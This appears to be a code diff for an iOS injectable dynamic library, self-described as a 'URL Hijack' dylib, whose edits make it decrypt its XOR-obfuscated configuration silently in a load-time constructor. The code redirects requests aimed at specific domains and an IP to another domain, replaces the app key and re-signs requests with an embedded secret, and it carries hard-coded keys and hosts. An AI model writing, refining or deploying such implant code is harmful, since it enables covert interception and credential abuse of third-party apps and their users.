@@ -1,5 +1,5 @@
 // URLHijackDetector.m
-// iOS URL Hijack Dylib - 加密版（基于可工作版本）
+// iOS URL Hijack Dylib - 加密版（无日志）
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
 #import <CommonCrypto/CommonDigest.h>
@@ -19,87 +19,62 @@ static NSString* xorDecrypt(const unsigned char *encrypted, size_t length, unsig
 
 #define DECRYPT_STR(arr, key) xorDecrypt(arr, sizeof(arr), key)
 
-#pragma mark - 加密的配置数据
+#pragma mark - 加密的配置数据（XOR 0x5A）
 
-// "api1.7ccccccc.com" XOR 0x5A
+// "api1.7ccccccc.com"
 static const unsigned char _enc_domain1[] = {0x39, 0x2b, 0x2a, 0x78, 0x3b, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
-// "api2.7ccccccc.com" XOR 0x5A
+// "api2.7ccccccc.com"
 static const unsigned char _enc_domain2[] = {0x39, 0x2b, 0x2a, 0x78, 0x34, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
-// "api3.7ccccccc.com" XOR 0x5A
+// "api3.7ccccccc.com"
 static const unsigned char _enc_domain3[] = {0x39, 0x2b, 0x2a, 0x78, 0x35, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
-// "45.205.27.82:8080" XOR 0x5A
+// "45.205.27.82:8080"
 static const unsigned char _enc_ip[] = {0x1f, 0x7b, 0x32, 0x3e, 0x2f, 0x7f, 0x32, 0x3b, 0x2d, 0x2f, 0x7e, 0x32, 0x30, 0x2e, 0x2c, 0x0b, 0x34, 0x34, 0x34, 0x34};
-// "api123.hezijun.top" XOR 0x5A
+// "api123.hezijun.top"
 static const unsigned char _enc_newdomain[] = {0x39, 0x2b, 0x2a, 0x78, 0x7d, 0x7d, 0x7d, 0x24, 0x2b, 0x3a, 0x2b, 0x28, 0x2e, 0x3a, 0x78, 0x3b, 0x2b, 0x3a, 0x2a, 0x3b};
-// "LWtAvVixXX39mGYL2w" XOR 0x5A
+// "LWtAvVixXX39mGYL2w"
 static const unsigned char _enc_oldappkey[] = {0x1c, 0x52, 0x3f, 0x2d, 0x44, 0x4f, 0x2a, 0x1c, 0x1c, 0x6b, 0x6b, 0x7b, 0x7d, 0x2d, 0x1f, 0x4d, 0x1a, 0x6b, 0x7d};
-// "QLObIPwnDOVts3mzw9" XOR 0x5A
+// "QLObIPwnDOVts3mzw9"
 static const unsigned char _enc_newappkey[] = {0x1d, 0x11, 0x1c, 0x2a, 0x4b, 0x54, 0x4c, 0x2b, 0x1d, 0x1d, 0x0b, 0x4e, 0x1c, 0x6f, 0x1e, 0x4e, 0x4e, 0x5f, 0x6b};
-// "XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx" XOR 0x5A
+// "XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx"
 static const unsigned char _enc_appsecret[] = {0x1c, 0x3f, 0x4c, 0x2d, 0x3e, 0x4c, 0x54, 0x0d, 0x4c, 0x1c, 0x78, 0x0d, 0x1e, 0x2c, 0x0d, 0x48, 0x35, 0x2c, 0x1b, 0x4c, 0x04, 0x0d, 0x48, 0x1c, 0x2f, 0x1b, 0x0e, 0x1e, 0x0d, 0x1c, 0x0d, 0x48, 0x0d, 0x2b, 0x1d, 0x1e};
 
-#pragma mark - 配置区（通过解密获取）
+#pragma mark - 全局配置变量
 
-static NSSet<NSString *> *getTargetDomains(void) {
-    static NSSet *domains = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        NSString *d1 = DECRYPT_STR(_enc_domain1, 0x5A);
-        NSString *d2 = DECRYPT_STR(_enc_domain2, 0x5A);
-        NSString *d3 = DECRYPT_STR(_enc_domain3, 0x5A);
-        NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
-        domains = [NSSet setWithArray:@[d1, d2, d3, ip]];
-    });
-    return domains;
+static NSSet<NSString *> *g_targetDomains = nil;
+static NSSet<NSString *> *g_redirectIPs = nil;
+static NSString *g_newDomain = nil;
+static NSString *g_oldAppKey = nil;
+static NSString *g_newAppKey = nil;
+static NSString *g_appSecret = nil;
+
+#pragma mark - 配置获取函数
+
+static NSSet<NSString *> *getTargetDomains(void) { return g_targetDomains; }
+static NSSet<NSString *> *getRedirectIPs(void) { return g_redirectIPs; }
+static NSString *getNewDomain(void) { return g_newDomain; }
+static NSString *getOldAppKey(void) { return g_oldAppKey; }
+static NSString *getNewAppKey(void) { return g_newAppKey; }
+static NSString *getAppSecret(void) { return g_appSecret; }
+
+#pragma mark - 一次性解密所有配置
+
+static void decryptAllConfigs(void) {
+    NSString *d1 = DECRYPT_STR(_enc_domain1, 0x5A);
+    NSString *d2 = DECRYPT_STR(_enc_domain2, 0x5A);
+    NSString *d3 = DECRYPT_STR(_enc_domain3, 0x5A);
+    NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
+    g_targetDomains = [[NSSet alloc] initWithArray:@[d1, d2, d3, ip]];
+    
+    NSString *redirectIp = DECRYPT_STR(_enc_ip, 0x5A);
+    g_redirectIPs = [[NSSet alloc] initWithArray:@[redirectIp]];
+    
+    g_newDomain = DECRYPT_STR(_enc_newdomain, 0x5A);
+    g_oldAppKey = DECRYPT_STR(_enc_oldappkey, 0x5A);
+    g_newAppKey = DECRYPT_STR(_enc_newappkey, 0x5A);
+    g_appSecret = DECRYPT_STR(_enc_appsecret, 0x5A);
 }
 
-static NSSet<NSString *> *getRedirectIPs(void) {
-    static NSSet *ips = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
-        ips = [NSSet setWithArray:@[ip]];
-    });
-    return ips;
-}
-
-static NSString *getNewDomain(void) {
-    static NSString *domain = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        domain = DECRYPT_STR(_enc_newdomain, 0x5A);
-    });
-    return domain;
-}
-
-static NSString *getOldAppKey(void) {
-    static NSString *appKey = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        appKey = DECRYPT_STR(_enc_oldappkey, 0x5A);
-    });
-    return appKey;
-}
-
-static NSString *getNewAppKey(void) {
-    static NSString *appKey = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        appKey = DECRYPT_STR(_enc_newappkey, 0x5A);
-    });
-    return appKey;
-}
-
-static NSString *getAppSecret(void) {
-    static NSString *secret = nil;
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        secret = DECRYPT_STR(_enc_appsecret, 0x5A);
-    });
-    return secret;
-}
-
-#pragma mark - 加密工具函数
+#pragma mark - 工具函数
 
 static NSString* md5(NSString *string) {
     const char *cStr = [string UTF8String];
@@ -149,13 +124,10 @@ static NSData* modifyRequestBody(NSData *originalBody, NSString *originalURL, NS
         }
     }
     
-    NSString *oldAppKey = getOldAppKey();
-    NSString *newAppKey = getNewAppKey();
-    
-    if ([params[@"appKey"] isEqualToString:oldAppKey]) {
-        params[@"appKey"] = newAppKey;
+    if ([params[@"appKey"] isEqualToString:g_oldAppKey]) {
+        params[@"appKey"] = g_newAppKey;
         
-        NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
+        NSString *newSign = calculateSign(httpMethod, host, path, params, g_appSecret);
         params[@"sign"] = newSign;
         
         NSMutableArray *newPairs = [NSMutableArray array];
@@ -188,23 +160,23 @@ static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outH
     }
     
     BOOL needsRedirect = NO;
-    if (hostWithPort && [getRedirectIPs() containsObject:hostWithPort]) {
+    if (hostWithPort && [g_redirectIPs containsObject:hostWithPort]) {
         needsRedirect = YES;
-    } else if ([getRedirectIPs() containsObject:host]) {
+    } else if ([g_redirectIPs containsObject:host]) {
         needsRedirect = YES;
     }
     
     if (needsRedirect) {
         NSString *newURLString = originalURLString;
         newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
-                                                               withString:getNewDomain()];
+                                                               withString:g_newDomain];
         if (url.port) {
             NSString *oldPortStr = [NSString stringWithFormat:@":%d", [url.port intValue]];
             newURLString = [newURLString stringByReplacingOccurrencesOfString:oldPortStr 
                                                                    withString:@""];
         }
         
-        if (outHost) *outHost = getNewDomain();
+        if (outHost) *outHost = g_newDomain;
         
         return newURLString;
     }
@@ -219,13 +191,13 @@ static BOOL isTargetRequest(NSString *urlString) {
     NSString *host = url.host;
     if (!host) return NO;
     
-    if ([getTargetDomains() containsObject:host]) {
+    if ([g_targetDomains containsObject:host]) {
         return YES;
     }
     
     if (url.port) {
         NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
-        if ([getTargetDomains() containsObject:hostWithPort]) {
+        if ([g_targetDomains containsObject:hostWithPort]) {
             return YES;
         }
     }
@@ -308,9 +280,9 @@ static BOOL isTargetRequest(NSString *urlString) {
 
 @end
 
+#pragma mark - 入口点
+
 __attribute__((constructor))
-static void initialize() {
-    // 静默加载 - 生产环境不输出日志
-    // 如需调试，取消下面的注释
-    // NSLog(@"[Hijack] Loaded");
+static void initialize(void) {
+    decryptAllConfigs();
 }
